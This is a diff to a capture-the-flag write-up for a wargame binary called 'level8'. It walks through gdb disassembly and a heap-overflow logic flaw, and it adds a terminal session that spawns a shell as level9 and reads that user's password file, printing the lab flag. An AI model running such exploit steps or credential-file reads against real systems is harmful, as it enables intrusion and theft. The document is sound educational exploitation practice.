@@ -1,5 +1,5 @@
 ## level8
-In `level8` as opposed to the others the call to `system()` is inside the `main()` function, running the program will make it print *nil nil* and when we try to disassembly the program the disassembled code it's huge comparing to the others, so going through it with __gdb__ will show  some texts that we could think to be the inputs to pass to this program<br>
+In `level8` as opposed to the others the call to `system()` is inside the `main()` function, running the program will make it print *nil nil* and when we try to disassembly the program the disassembled code it's huge comparing to the others, so going through it with __gdb__ we will see some texts that we could think to be the inputs to pass to this program<br>
 ```
 0x080485c1 <+93>:	mov    eax,0x8048819
 (gdb) x/s 0x8048819
@@ -11,7 +11,7 @@ Righ after this I was faced with some *assembly code* that looks very weird to m
 0x080485d1 <+109>:	seta   dl
 0x080485d4 <+112>:	setb   al
 ```
-After some search  I could find this [SO-POST](https://stackoverflow.com/questions/44630262/what-do-the-assembly-instructions-seta-and-setb-do-after-repz-cmpsb/44630741) that could clarify some parts and made me understand that it was comparing a string character by charater,<br> *why bother? why not just call `strcmp`?* maybe to try to make it more complicated ? and there are also a bunch of *flags* being set in this way of doing the comparasion.<br> The next string we will find in the dissableded code:
+After some search  I could find this post [SO](https://stackoverflow.com/questions/44630262/what-do-the-assembly-instructions-seta-and-setb-do-after-repz-cmpsb/44630741) that could clarify some parts and made me understand that it was comparing a string character by charater,<br> *why bother? why not just call `strcmp`?* maybe to try to make it more complicated ? and there are also a bunch of *flags* being set in this way of doing the comparasion.<br> The next string we will find in the dissableded code:
 ```
 => 0x08048642 <+222>:	lea    eax,[esp+0x20]
    0x08048646 <+226>:	mov    edx,eax
@@ -94,10 +94,25 @@ and if we check this address we will recognize it from the command line:
 (gdb) x/4xw 0x8049aac
 0x8049aac <auth>:	0x0804a008	0x0804a028	0x00000000	0x00000000
 ```
-We can see that is this address that we are writing to when we enter ``` `auth ` ``` and `service` as the arguments to the program, we can see from the snippet above that the prgram is loading this __address__ to the register `eax` and then adding `0x20` to it:
+We can see that this is the address that we are writing to when we enter ``` `auth ` ``` and `service` as the arguments to the program, we can see from the snippet above that the program is loading this __address__ to the register `eax` and then adding `0x20` to it:
 
 |Address|||
 |---|---|---|
 |0x8049aac| =| 0x0804a008|
 |0x0804a008|+| 0x20|
 |0x0804a028|||
+
+So if we write enough characters to `0x0804a008` we will put a `\n` at the end of the buffer and the ` 0x080486ea <+390>:	test   eax,eax` will evalutates to not equal so the program will not jump and will execute the call to `0x080486f5 <+401>:	call   0x8048480 <system@plt>` what will gives us a *shell* to `level9`
+```
+~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service AAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
